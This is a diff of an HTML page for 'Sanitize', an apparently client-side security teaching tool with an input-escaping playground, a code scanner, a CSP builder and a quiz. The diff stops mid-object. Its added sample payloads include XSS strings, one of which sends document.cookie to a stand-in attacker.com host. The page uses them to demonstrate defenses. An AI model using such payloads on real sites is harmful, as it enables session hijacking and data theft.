@@ -1,686 +1,1688 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
- <!-- Google tag (gtag.js) -->
+<!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-LWHP912FXJ"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
-
   gtag('config', 'G-LWHP912FXJ');
 </script>
 <meta charset="UTF-8">
- <meta name="google-site-verification" content="2Q4gEr9VJmQhZMMkI4hJve6eQRPymHbEnfN3ex-xC0s" />
+<meta name="google-site-verification" content="2Q4gEr9VJmQhZMMkI4hJve6eQRPymHbEnfN3ex-xC0s" />
 <meta name="monetag" content="f22fbce49c0fd70db4d466ea313e833c">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Free Secure Code Scanner – XSS, SQL Injection & CSP Vulnerability Checker</title>
-<meta name="description" content="Free client-side code vulnerability scanner. Detect XSS, SQL injection, command injection and more. Includes interactive CSP builder, input sanitization playground and security quiz. No signup required.">
+<title>Sanitize - Secure Code Scanner & Input Defense Toolkit</title>
+<meta name="description" content="Free client-side cybersecurity tool to scan code snippets for security vulnerabilities, test context-aware input sanitization, and generate Content-Security-Policies.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,560;9..144,650&family=Public+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,560;9..144,650&family=Public+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
 :root{
  --bg:#eef1ea;--paper:#fffdf9;--paper2:#f6f3ec;--line:#d9ddce;
  --ink:#22301f;--muted:#647063;--safe:#2f6f5e;--safe-bg:#e5f0e9;
  --danger:#a04f37;--danger-bg:#f6e6de;--warn:#96741f;--warn-bg:#f4ecd9;
+ --info:#255d84;--info-bg:#e1edf5;
  --shadow:0 1px 2px rgba(30,40,25,.05),0 8px 24px rgba(30,40,25,.06);
 }
 *{box-sizing:border-box}
 body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.5 "Public Sans",system-ui,sans-serif;}
 h1,h2,h3{font-family:"Fraunces",Georgia,serif;font-weight:560;margin:0}
 code,pre,.mono{font-family:"IBM Plex Mono",ui-monospace,Consolas,monospace}
-button:focus-visible,input:focus-visible,textarea:focus-visible{outline:2px solid var(--safe);outline-offset:2px}
-.shell{display:grid;grid-template-columns:220px 1fr;min-height:100vh}
-aside{border-right:1px solid var(--line);padding:28px 18px;position:sticky;top:0;height:100vh;overflow-y:auto}
-.mark{width:34px;height:34px;border-radius:8px;background:var(--safe);color:#fff;display:grid;place-items:center;font-family:"Fraunces",serif;font-weight:650;font-size:16px;margin-bottom:10px}
-aside h1{font-size:19px;line-height:1.2}
-aside p{color:var(--muted);font-size:12.5px;margin:6px 0 26px}
-.navgroup{margin-bottom:22px}
-.navgroup h3{font-size:10.5px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);font-family:"Public Sans";font-weight:600;margin-bottom:8px}
-.navbtn{display:block;width:100%;text-align:left;border:0;background:none;padding:8px 9px;border-radius:6px;color:var(--muted);cursor:pointer;font:500 13px "Public Sans"}
+button:focus-visible,input:focus-visible,textarea:focus-visible,select:focus-visible{outline:2px solid var(--safe);outline-offset:2px}
+.shell{display:grid;grid-template-columns:240px 1fr;min-height:100vh}
+aside{border-right:1px solid var(--line);padding:24px 18px;position:sticky;top:0;height:100vh;overflow-y:auto;background:var(--bg)}
+.brand{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+.mark{width:36px;height:36px;border-radius:9px;background:var(--safe);color:#fff;display:grid;place-items:center;font-family:"Fraunces",serif;font-weight:650;font-size:18px;box-shadow:0 2px 6px rgba(47,111,94,.3)}
+aside h1{font-size:20px;line-height:1.2}
+aside .tagline{color:var(--muted);font-size:12.5px;margin:4px 0 22px;line-height:1.4}
+.navgroup{margin-bottom:20px}
+.navgroup h3{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);font-family:"Public Sans";font-weight:700;margin-bottom:8px}
+.navbtn{display:flex;align-items:center;justify-content:space-between;width:100%;text-align:left;border:0;background:none;padding:9px 11px;border-radius:7px;color:var(--muted);cursor:pointer;font:500 13px "Public Sans";transition:all .15s ease}
 .navbtn:hover{background:var(--paper2);color:var(--ink)}
 .navbtn.active{background:var(--safe-bg);color:var(--safe);font-weight:600}
-.footnote{font-size:11px;color:var(--muted);line-height:1.6;border-top:1px solid var(--line);padding-top:12px;margin-top:20px}
-main{padding:40px 44px;max-width:1000px}
-.hero{margin-bottom:30px}
-.hero h1{font-size:32px;line-height:1.15;max-width:17ch}
-.hero p{max-width:60ch;color:var(--muted);font-size:15px;margin-top:10px}
-.contexts{display:flex;gap:6px;flex-wrap:wrap;margin:26px 0 20px;border-bottom:1px solid var(--line);padding-bottom:16px}
-.ctxbtn{border:1px solid var(--line);background:var(--paper);padding:9px 13px;border-radius:99px;cursor:pointer;font:500 13px "Public Sans";color:var(--muted)}
+.navbtn .navbadge{font-size:10px;padding:2px 6px;border-radius:99px;background:rgba(0,0,0,.06)}
+.navbtn.active .navbadge{background:var(--safe);color:#fff}
+.footnote{font-size:11px;color:var(--muted);line-height:1.55;border-top:1px solid var(--line);padding-top:14px;margin-top:16px}
+.author-card{margin-top:18px;padding:12px;border:1px solid var(--line);border-radius:9px;background:var(--paper);text-align:center}
+.author-card .name{font-size:12px;color:var(--muted);margin-bottom:6px}
+.author-card .links{display:flex;gap:10px;justify-content:center}
+.author-card a{font-size:11.5px;color:var(--safe);text-decoration:none;font-weight:600}
+.author-card a:hover{text-decoration:underline}
+
+main{padding:36px 40px;max-width:1080px}
+.hero{margin-bottom:26px}
+.hero h1{font-size:30px;line-height:1.2;max-width:20ch}
+.hero p{max-width:65ch;color:var(--muted);font-size:14.5px;margin-top:8px}
+
+.contexts{display:flex;gap:6px;flex-wrap:wrap;margin:20px 0 18px;border-bottom:1px solid var(--line);padding-bottom:14px}
+.ctxbtn{border:1px solid var(--line);background:var(--paper);padding:8px 13px;border-radius:99px;cursor:pointer;font:500 12.5px "Public Sans";color:var(--muted);transition:all .15s}
+.ctxbtn:hover{border-color:var(--ink);color:var(--ink)}
 .ctxbtn.active{background:var(--ink);color:var(--paper);border-color:var(--ink)}
-.workbench{display:grid;grid-template-columns:1fr 1fr;gap:16px;align-items:start}
+
+.workbench{display:grid;grid-template-columns:1fr 1fr;gap:18px;align-items:start}
 .card{background:var(--paper);border:1px solid var(--line);border-radius:12px;padding:20px;box-shadow:var(--shadow)}
 .card h2{font-size:16px;margin-bottom:4px}
-.card .sub{color:var(--muted);font-size:12.5px;margin-bottom:14px}
-textarea{width:100%;min-height:110px;border:1px solid var(--line);border-radius:8px;padding:11px;background:var(--paper2);color:var(--ink);resize:vertical;font:13px "IBM Plex Mono";outline:0}
+.card .sub{color:var(--muted);font-size:12.5px;margin-bottom:12px}
+
+textarea{width:100%;min-height:110px;border:1px solid var(--line);border-radius:8px;padding:11px;background:var(--paper2);color:var(--ink);resize:vertical;font:13px "IBM Plex Mono";outline:0;transition:border-color .15s}
 textarea:focus{border-color:var(--safe)}
-.panel{border-radius:9px;padding:13px;margin-top:12px;font:13px "IBM Plex Mono";white-space:pre-wrap;word-break:break-word;line-height:1.6}
+
+.panel{border-radius:9px;padding:13px;margin-top:12px;font:13px "IBM Plex Mono";white-space:pre-wrap;word-break:break-word;line-height:1.6;position:relative}
 .panel.danger{background:var(--danger-bg);border:1px solid #e2c3b3}
 .panel.safe{background:var(--safe-bg);border:1px solid #bfdbcd}
-.panellabel{font:600 10.5px "Public Sans";text-transform:uppercase;letter-spacing:.06em;margin-bottom:7px;display:flex;align-items:center;gap:6px;justify-content:space-between}
+.panellabel{font:600 11px "Public Sans";text-transform:uppercase;letter-spacing:.06em;margin-bottom:7px;display:flex;align-items:center;gap:6px;justify-content:space-between}
 .panellabel.danger{color:var(--danger)}
 .panellabel.safe{color:var(--safe)}
-.flag{background:rgba(160,79,55,.22);border-radius:3px;padding:0 1px;font-weight:600}
+.flag{background:rgba(160,79,55,.28);border-radius:3px;padding:0 2px;font-weight:700;color:#7a1d06}
+
 .explain{margin-top:14px;font-size:13.5px;color:#3c4a37;line-height:1.65}
 .explain b{color:var(--ink)}
 .typenote{margin-top:10px;font-size:12.5px;color:#6b5311;background:var(--warn-bg);border:1px solid #e3d6ac;border-radius:8px;padding:9px 11px;line-height:1.55}
-.typenote code{background:rgba(0,0,0,.05);padding:0 3px;border-radius:3px}
-.snippet{margin-top:10px;background:#1d271c;color:#dbe6d6;border-radius:9px;padding:14px;font:12.5px/1.6 "IBM Plex Mono";overflow-x:auto}
-.snippet .cm{color:#8a9a83}
-.stat-row{display:flex;gap:10px;margin-top:12px;flex-wrap:wrap}
-.stat{background:var(--paper2);border:1px solid var(--line);border-radius:7px;padding:7px 11px;font-size:12px;color:var(--muted)}
+.typenote code{background:rgba(0,0,0,.06);padding:1px 4px;border-radius:3px}
+.snippet{margin-top:10px;background:#182218;color:#d8e5d3;border-radius:9px;padding:13px;font:12px/1.6 "IBM Plex Mono";overflow-x:auto}
+.snippet .cm{color:#889e82}
+
+.stat-row{display:flex;gap:10px;margin-top:12px;flex-wrap:wrap;align-items:center}
+.stat{background:var(--paper2);border:1px solid var(--line);border-radius:7px;padding:6px 11px;font-size:12px;color:var(--muted)}
 .stat b{color:var(--ink);font-family:"IBM Plex Mono"}
-.copybtn{border:1px solid var(--line);background:transparent;border-radius:6px;padding:3px 8px;font:500 10.5px "Public Sans";color:var(--muted);cursor:pointer}
-.copybtn:hover{background:var(--paper2);color:var(--ink)}
+
+.action-bar{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0}
+.action-btn{border:1px solid var(--line);background:var(--paper2);border-radius:6px;padding:5px 9px;font:500 11.5px "Public Sans";color:var(--ink);cursor:pointer;display:inline-flex;align-items:center;gap:4px;transition:all .15s}
+.action-btn:hover{background:var(--paper);border-color:var(--safe);color:var(--safe)}
+
+.copybtn{border:1px solid var(--line);background:var(--paper);border-radius:6px;padding:4px 9px;font:500 11px "Public Sans";color:var(--muted);cursor:pointer;transition:all .15s}
+.copybtn:hover{background:var(--paper2);color:var(--ink);border-color:var(--muted)}
+
 .refhead{margin:0 0 16px}
 .refgrid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
 .refcard{background:var(--paper);border:1px solid var(--line);border-radius:11px;padding:17px}
 .refcard h3{font-size:14.5px;margin-bottom:6px}
 .refcard .principle{color:var(--safe);font:600 12px "Public Sans";margin-bottom:8px}
 .refcard p{color:var(--muted);font-size:13px;line-height:1.6;margin:0}
-.section-heading{font-size:19px;margin:34px 0 14px}
-.page{display:none}.page.active{display:block}
-.findcard{background:var(--paper);border:1px solid var(--line);border-radius:11px;padding:16px}
-.findhead{display:flex;justify-content:space-between;align-items:flex-start;gap:10px}
-.findhead h3{font-size:14.5px}
-.badge{font:600 11px "Public Sans";border-radius:99px;padding:4px 10px;white-space:nowrap}
+.section-heading{font-size:19px;margin:32px 0 14px}
+
+.page{display:none}
+.page.active{display:block}
+
+/* Scanner Enhanced Styles */
+.scanner-controls{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;margin:12px 0 14px}
+.preset-group{display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+.filter-tabs{display:flex;gap:6px;flex-wrap:wrap}
+.filter-tab{border:1px solid var(--line);background:var(--paper);padding:6px 11px;border-radius:6px;font:500 12px "Public Sans";cursor:pointer;color:var(--muted)}
+.filter-tab.active{background:var(--ink);color:#fff;border-color:var(--ink)}
+.findcard{background:var(--paper);border:1px solid var(--line);border-radius:11px;padding:16px;box-shadow:var(--shadow);transition:border-color .15s}
+.findcard.high{border-left:4px solid var(--danger)}
+.findcard.medium{border-left:4px solid var(--warn)}
+.findcard.low{border-left:4px solid var(--info)}
+.findhead{display:flex;justify-content:space-between;align-items:flex-start;gap:10px;flex-wrap:wrap}
+.findhead h3{font-size:14.5px;display:flex;align-items:center;gap:6px}
+.badge{font:600 11px "Public Sans";border-radius:99px;padding:3px 9px;white-space:nowrap;display:inline-flex;align-items:center;gap:4px}
+.code-preview{margin-top:10px;background:#182218;color:#d8e5d3;border-radius:8px;padding:10px 12px;font:12px/1.5 "IBM Plex Mono";overflow-x:auto}
+.code-preview .line-num{color:#647560;user-select:none;margin-right:10px}
+.code-preview mark{background:#a04f37;color:#fff;border-radius:2px;padding:0 2px}
+
+/* CSP & Quiz Styles */
 .cspopt{display:flex;gap:9px;align-items:flex-start;font-size:13px;color:var(--ink);padding:8px 0;border-bottom:1px solid var(--paper2)}
 .cspopt small{display:block;color:var(--muted);font-size:11.5px;margin-top:2px}
-.cspfield{display:block;margin-top:14px;color:var(--muted);font-size:11.5px}
+.cspfield{display:block;margin-top:14px;color:var(--muted);font-size:11.5px;font-weight:600}
 .cspinput{width:100%;padding:9px;margin-top:5px;border:1px solid var(--line);border-radius:8px;background:var(--paper2);color:var(--ink);font:13px "IBM Plex Mono";outline:0}
-.quizopt{border:1px solid var(--line);border-radius:9px;padding:11px 13px;text-align:left;background:var(--paper2);cursor:pointer;font:500 13.5px "Public Sans";color:var(--ink)}
-.quizopt:hover:not(:disabled){border-color:var(--safe)}
+.quizopt{border:1px solid var(--line);border-radius:9px;padding:12px 14px;text-align:left;background:var(--paper2);cursor:pointer;font:500 13.5px "Public Sans";color:var(--ink);transition:all .15s}
+.quizopt:hover:not(:disabled){border-color:var(--safe);background:var(--paper)}
 .quizopt:disabled{cursor:default}
-@media(max-width:880px){.shell{grid-template-columns:1fr}aside{position:static;height:auto}.workbench,.refgrid{grid-template-columns:1fr}main{padding:26px 20px}}
+.quiz-progress{height:6px;background:var(--line);border-radius:99px;overflow:hidden;margin:12px 0 16px}
+.quiz-progress-fill{height:100%;background:var(--safe);width:0%;transition:width .25s ease}
+
+/* Quick toast notification */
+#toast{position:fixed;bottom:24px;right:24px;background:var(--ink);color:#fff;padding:10px 18px;border-radius:8px;font-size:12.5px;font-weight:500;box-shadow:0 6px 18px rgba(0,0,0,.2);opacity:0;pointer-events:none;transition:opacity .2s;z-index:9999}
+
+@media(max-width:900px){
+ .shell{grid-template-columns:1fr}
+ aside{position:static;height:auto;border-right:0;border-bottom:1px solid var(--line)}
+ .workbench,.refgrid{grid-template-columns:1fr}
+ main{padding:24px 18px}
+}
 </style>
 </head>
 <body>
 <div class="shell">
 <aside>
- <div class="mark">S</div>
- <h1>Sanitize</h1>
- <p>A field guide and toolkit for handling untrusted input safely.</p>
+ <div class="brand">
+  <div class="mark">S</div>
+  <div>
+   <h1>Sanitize</h1>
+   <span style="font-size:11px;color:var(--safe);font-weight:600">v2.0 Pro Security Suite</span>
+  </div>
+ </div>
+ <div class="tagline">Browser-based defense studio & static security scanner for modern web stacks.</div>
+
  <div class="navgroup">
   <h3>Toolkit</h3>
-  <button class="navbtn active" data-page="workbench" onclick="goPage('workbench',this)">Context playground</button>
-  <button class="navbtn" data-page="scanner" onclick="goPage('scanner',this)">Code scanner</button>
-  <button class="navbtn" data-page="csp" onclick="goPage('csp',this)">CSP builder</button>
-  <button class="navbtn" data-page="quiz" onclick="goPage('quiz',this)">Learn: quiz</button>
-  <button class="navbtn" data-page="reference" onclick="goPage('reference',this)">Vulnerability reference</button>
+  <button class="navbtn active" data-page="workbench" onclick="goPage('workbench',this)">
+   <span>Context playground</span><span class="navbadge">12</span>
+  </button>
+  <button class="navbtn" data-page="scanner" onclick="goPage('scanner',this)">
+   <span>Code scanner</span><span class="navbadge" id="navScanBadge">35+ rules</span>
+  </button>
+  <button class="navbtn" data-page="csp" onclick="goPage('csp',this)">
+   <span>CSP builder</span><span class="navbadge">Level 3</span>
+  </button>
+  <button class="navbtn" data-page="quiz" onclick="goPage('quiz',this)">
+   <span>Defense quiz</span><span class="navbadge">10 Qs</span>
+  </button>
+  <button class="navbtn" data-page="reference" onclick="goPage('reference',this)">
+   <span>Vulnerability reference</span><span class="navbadge">OWASP</span>
+  </button>
  </div>
- <div class="footnote">Runs entirely in your browser, nothing is sent anywhere. Nothing here builds or executes working exploit code — only defensive transforms and heuristic pattern-matching over text you provide.</div>
 
- <!-- Developer Branding Section -->
- <div style="margin-top: 25px; padding-top: 15px; border-top: 1px solid var(--line); text-align: center;">
-     <div style="font-size: 11px; color: var(--muted); margin-bottom: 8px;">Developed by <b style="color: var(--ink);">Nadeeja</b></div>
-     <div style="display: flex; gap: 10px; justify-content: center;">
-         <a href="https://www.linkedin.com/in/nadeeja-hirun/" target="_blank" style="font-size: 11px; color: var(--safe); text-decoration: none; font-weight: 600;">LinkedIn</a>
-         <a href="https://web.facebook.com/nadeeja.hirun.2025" target="_blank" style="font-size: 11px; color: var(--safe); text-decoration: none; font-weight: 600;">Facebook</a>
-     </div>
+ <div class="footnote">
+  Runs 100% locally in your web browser. No code or input is ever uploaded to any server. Completely safe for proprietary or internal code audit.
  </div>
 
+ <div class="author-card">
+  <div class="name">Developed by <b style="color:var(--ink);">Nadeeja</b></div>
+  <div class="links">
+   <a href="https://www.linkedin.com/in/nadeeja-hirun/" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+   <span>·</span>
+   <a href="https://web.facebook.com/nadeeja.hirun.2025" target="_blank" rel="noopener noreferrer">Facebook</a>
+  </div>
+ </div>
 </aside>
+
 <main>
 
+<!-- PAGE 1: WORKBENCH -->
 <section id="workbench" class="page active">
  <div class="hero">
   <h1>The fix depends on where the string lands.</h1>
-  <p>The same piece of user input needs a different defense depending on where it ends up. Pick a destination context — from a page body to a log line — and see why, character by character.</p>
+  <p>The exact same untrusted payload requires a completely different defense depending on the sink context. Select a destination sink below to see the exact transformation and why standard single escaping fails.</p>
  </div>
 
  <div class="contexts" id="contexts"></div>
 
  <div class="workbench">
   <div class="card">
-   <h2>Untrusted input</h2>
-   <div class="sub" id="ctxDesc">What a user (or attacker) might type into this field.</div>
+   <div style="display:flex;justify-content:space-between;align-items:baseline">
+    <h2>Untrusted input</h2>
+    <div style="font-size:11px;color:var(--muted)">Live Reactive</div>
+   </div>
+   <div class="sub" id="ctxDesc">What a user or attacker inputs.</div>
+
+   <div class="action-bar" id="payloadList"></div>
+
    <textarea id="raw" spellcheck="false" oninput="render()"></textarea>
+
    <div class="stat-row">
     <div class="stat"><b id="statLen">0</b> characters</div>
-    <div class="stat"><b id="statFlag">0</b> flagged</div>
+    <div class="stat"><b id="statFlag">0</b> flagged chars</div>
+    <button class="copybtn" onclick="clearInput()">clear</button>
+    <button class="copybtn" onclick="resetDefaultPayload()">reset example</button>
    </div>
   </div>
 
   <div class="card">
    <h2>Where it goes</h2>
-   <div class="sub">Same input, handled unsafely vs. handled correctly.</div>
+   <div class="sub">Unsafe interpolation vs. Context-Aware Defense</div>
+
    <div class="panel danger">
-    <div class="panellabel danger"><span>⚠ If concatenated directly</span></div>
+    <div class="panellabel danger">
+     <span>⚠ Unsafe Concat / Injection Sink</span>
+    </div>
     <div id="unsafeOut">—</div>
    </div>
+
    <div class="typenote" id="typeNote" style="display:none"></div>
+
    <div class="panel safe">
-    <div class="panellabel safe"><span>✓ Defended</span><button class="copybtn" onclick="copyText('safeOut',this)">copy</button></div>
+    <div class="panellabel safe">
+     <span>✓ Correct Defense Applied</span>
+     <button class="copybtn" onclick="copyText('safeOut',this)">copy output</button>
+    </div>
     <div id="safeOut">—</div>
    </div>
+
    <div class="explain" id="explainOut"></div>
    <div class="snippet" id="codeOut"></div>
   </div>
  </div>
 </section>
 
+<!-- PAGE 2: SCANNER -->
 <section id="scanner" class="page">
  <div class="hero">
-  <h1>Scan a snippet for risky patterns.</h1>
-  <p>Paste a code snippet and get a heuristic pass over common anti-patterns — the kind a security-minded reviewer flags in a pull request. This only pattern-matches text; nothing you paste is executed.</p>
+  <h1>Static Vulnerability & Anti-Pattern Scanner</h1>
+  <p>Paste your function, API route, or script. The scanner uses 35+ security rules covering OWASP Top 10 vulnerabilities across JavaScript, Node.js, Python, PHP, Java, and Go.</p>
  </div>
+
  <div class="card">
-  <h2>Paste code</h2>
-  <div class="sub">Any language — rules cover common risky calls across JS, Node, Python, PHP, and Java.</div>
-  <textarea id="scanIn" style="min-height:170px" placeholder="paste a function, route handler, or script here..." oninput="scan()"></textarea>
-  <div class="stat-row"><div class="stat"><b id="scanCount">0</b> findings</div></div>
+  <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px">
+   <div>
+    <h2>Source Code Input</h2>
+    <div class="sub">No code leaves your machine — all heuristic regex and AST pattern matching is client-side.</div>
+   </div>
+   <div class="preset-group">
+    <span style="font-size:11.5px;color:var(--muted)">Load Sample:</span>
+    <button class="action-btn" onclick="loadSample('node')">Node.js / Express</button>
+    <button class="action-btn" onclick="loadSample('python')">Python / Flask</button>
+    <button class="action-btn" onclick="loadSample('php')">PHP Legacy</button>
+    <button class="action-btn" onclick="loadSample('secure')">Secure Code</button>
+   </div>
+  </div>
+
+  <textarea id="scanIn" style="min-height:200px" placeholder="Paste source code here (JS/TS, Python, PHP, Java, Go, Shell)..." oninput="scan()"></textarea>
+
+  <div class="scanner-controls">
+   <div class="stat-row" style="margin-top:0">
+    <div class="stat"><b id="scanCount">0</b> total findings</div>
+    <div class="stat"><b id="scanHighCount" style="color:var(--danger)">0</b> High</div>
+    <div class="stat"><b id="scanMedCount" style="color:var(--warn)">0</b> Med</div>
+    <div class="stat"><b id="scanLowCount" style="color:var(--info)">0</b> Low</div>
+   </div>
+
+   <div class="filter-tabs">
+    <button class="filter-tab active" data-filter="all" onclick="filterFindings('all',this)">All</button>
+    <button class="filter-tab" data-filter="high" onclick="filterFindings('high',this)">High</button>
+    <button class="filter-tab" data-filter="medium" onclick="filterFindings('medium',this)">Medium</button>
+    <button class="filter-tab" data-filter="low" onclick="filterFindings('low',this)">Low</button>
+    <button class="action-btn" onclick="exportReport()" style="margin-left:6px">📋 Export Markdown Report</button>
+   </div>
+  </div>
  </div>
- <div id="scanResults" style="margin-top:14px;display:grid;gap:10px"></div>
+
+ <div id="scanResults" style="margin-top:16px;display:grid;gap:12px"></div>
 </section>
 
+<!-- PAGE 3: CSP BUILDER -->
 <section id="csp" class="page">
  <div class="hero">
-  <h1>Build a starting Content-Security-Policy.</h1>
-  <p>Pick the sources this page actually needs. Everything not listed stays closed — loosen only what you must.</p>
+  <h1>Content-Security-Policy (CSP) Architect</h1>
+  <p>Generate production-hardened CSP headers (Level 3) tailored to your application architecture. Mitigate XSS, data exfiltration, clickjacking, and packet sniffing.</p>
  </div>
+
  <div class="workbench">
   <div class="card">
-   <h2>Sources</h2>
-   <div class="sub">Toggle what this page legitimately needs.</div>
+   <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+    <h2>Policy Directives</h2>
+    <div class="preset-group">
+     <span style="font-size:11.5px;color:var(--muted)">Presets:</span>
+     <button class="action-btn" onclick="applyCspPreset('strict')">Strict Zero-Trust</button>
+     <button class="action-btn" onclick="applyCspPreset('spa')">SPA (React/Vue)</button>
+     <button class="action-btn" onclick="applyCspPreset('permissive')">CDN & Web Fonts</button>
+    </div>
+   </div>
+   <div class="sub">Toggle the legitimate capability sources your web app requires.</div>
+
    <div id="cspOpts"></div>
-   <label class="cspfield">Additional trusted script domains (optional, space or comma separated)</label>
-   <input id="cspExtra" class="cspinput" placeholder="https://cdn.example.com https://analytics.example.com" oninput="buildCSP()">
-   <label class="cspfield">Violation report endpoint (optional)</label>
-   <input id="cspReport" class="cspinput" placeholder="/csp-report" oninput="buildCSP()">
+
+   <label class="cspfield">Extra Trusted Script / API Domains (e.g. cdn.jsdelivr.net *.google-analytics.com)</label>
+   <input id="cspExtra" class="cspinput" placeholder="https://cdnjs.cloudflare.com *.googleapis.com" oninput="buildCSP()">
+
+   <label class="cspfield">Extra Connect-Src / WebSockets (e.g. api.mysite.com wss://socket.mysite.com)</label>
+   <input id="cspConnect" class="cspinput" placeholder="https://api.example.com wss://stream.example.com" oninput="buildCSP()">
+
+   <label class="cspfield">Violation Reporting Endpoint (report-uri / report-to)</label>
+   <input id="cspReport" class="cspinput" placeholder="https://endpoint.report-uri.com/r/d/csp/enforce" oninput="buildCSP()">
   </div>
+
   <div class="card">
-   <h2>Generated header</h2>
-   <div class="sub">Content-Security-Policy</div>
+   <div style="display:flex;justify-content:space-between;align-items:center">
+    <h2>Generated Policy</h2>
+    <div style="display:flex;gap:6px">
+     <button class="copybtn" onclick="copyText('cspOut',this)">Copy Header</button>
+     <button class="copybtn" onclick="copyCspMeta(this)">Copy &lt;meta&gt; Tag</button>
+    </div>
+   </div>
+   <div class="sub">Standard HTTP Response Header: Content-Security-Policy</div>
    <div class="snippet" id="cspOut"></div>
+
+   <div class="sub" style="margin-top:16px">HTML Equivalent Tag</div>
+   <div class="snippet" id="cspMetaOut" style="font-size:11.5px"></div>
+
    <div class="explain" id="cspExplain"></div>
   </div>
  </div>
 </section>
 
+<!-- PAGE 4: QUIZ -->
 <section id="quiz" class="page">
  <div class="hero">
-  <h1>Test what actually sticks.</h1>
-  <p>Eight scenario questions pulled from the contexts and fixes above. Guess before you check the explanation.</p>
+  <h1>Test Your Defensive Security Intuition</h1>
+  <p>10 scenario-based challenges designed to test whether you recognize proper defensive patterns versus risky band-aids.</p>
  </div>
- <div class="card" id="quizCard" style="max-width:640px"></div>
+ <div class="card" id="quizCard" style="max-width:680px"></div>
 </section>
 
+<!-- PAGE 5: REFERENCE -->
 <section id="reference" class="page">
  <div class="hero">
-  <h1>Common injection classes, and the actual fix.</h1>
-  <p>Not payload lists — the defensive principle that closes each class of bug, so you recognize the fix pattern anywhere you meet it.</p>
+  <h1>OWASP Injection Classes & Core Remedies</h1>
+  <p>Vulnerabilities happen when execution context confuses data with instructions. Here is the exact architectural remedy for each major vulnerability category.</p>
  </div>
  <div class="refgrid" id="refgrid"></div>
 
- <h2 class="section-heading">Framework defaults — what's safe out of the box</h2>
- <p style="color:var(--muted);font-size:13.5px;margin-top:-6px;margin-bottom:16px;max-width:70ch">Most modern frameworks auto-escape by default. The risk is usually the explicit escape hatch, reached for out of habit rather than a reviewed decision.</p>
+ <h2 class="section-heading">Framework Auto-Escaping Defaults & Escape Hatches</h2>
+ <p style="color:var(--muted);font-size:13.5px;margin-top:-6px;margin-bottom:16px;max-width:70ch">
+  Modern web engines sanitize bindings automatically. Flaws typically occur when engineers utilize explicit bypasses ("escape hatches").
+ </p>
  <div class="refgrid" id="frameworkgrid"></div>
 </section>
 
 </main>
 </div>
 
+<div id="toast">Copied to clipboard!</div>
+
 <script>
-function escapeHtml(s){return s.replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}
-function escapeHtmlAttr(s){return s.replace(/[&<>"'`=]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;','`':'&#96;','=':'&#61;'}[c]))}
+/* ==================== CORE UTILITIES ==================== */
+function escapeHtml(s){
+ if(!s) return '';
+ return s.replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+function escapeHtmlAttr(s){
+ if(!s) return '';
+ return s.replace(/[&<>"'`=\/]/g, c=>({
+  '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;','`':'&#96;','=':'&#61;','/':'&#47;'
+ }[c]));
+}
+
+function escapeJsString(s){
+ if(!s) return '""';
+ return JSON.stringify(s).replace(/</g,'\\u003c').replace(/>/g,'\\u003e');
+}
+
+function sanitizeCssValue(s){
+ if(!s) return '/* empty */';
+ return s.replace(/[\(\)'"<>\\;]/g, '_');
+}
+
 function sanitizeFilename(s){
- let c=s.replace(/[^A-Za-z0-9._-]/g,'_');
- c=c.replace(/\.{2,}/g,'_');
- c=c.replace(/^[._-]+/,'');
+ if(!s) return '(empty — reject)';
+ let c = s.replace(/[\x00-\x1f\x7f]/g,'');
+ c = c.replace(/[^A-Za-z0-9._-]/g,'_');
+ c = c.replace(/\.{2,}/g,'_');
+ c = c.replace(/^[._-]+/,'');
  return c || '(empty after sanitizing — reject)';
 }
+
 function sanitizeHeaderValue(s){
- let c=s.replace(/[\r\n]/g,'');
+ if(!s) return '(empty)';
+ let c = s.replace(/[\r\n\x00]/g,'');
  return c || '(empty after stripping CR/LF)';
 }
+
 function sanitizeLogLine(s){
- return s.replace(/[\r\n]/g,'\\n');
+ if(!s) return '';
+ return s.replace(/[\r\n]/g,'\\n').replace(/[\x00-\x1f\x7f]/g,'');
 }
 
+function showToast(msg){
+ const t = document.getElementById('toast');
+ t.textContent = msg;
+ t.style.opacity = '1';
+ setTimeout(()=>{ t.style.opacity='0'; }, 1600);
+}
+
+/* ==================== CONTEXT PLAYGROUND ==================== */
 const CTX = {
  htmlBody:{
-  label:'HTML page body', desc:'Text inserted into a page, e.g. a comment or profile bio.',
+  label:'HTML page body',
+  desc:'User text rendered inside DOM tags, e.g. a blog post, bio, or user comment.',
   placeholder:'Nice profile! <script>alert(1)<\/script>',
+  payloads:[
+   {label:'Script injection', val:'<script>fetch("https://attacker.com/steal?c="+document.cookie)<\/script>'},
+   {label:'Image event handler', val:'<img src="invalid-image" onerror="alert(document.domain)">'},
+   {label:'SVG onload', val:'<svg/onload=alert("XSS")>'}
+  ],
   before:'el.innerHTML = "', after:'"',
   flagChars:['<','>','&','"',"'"],
-  safe:s=>escapeHtml(s),
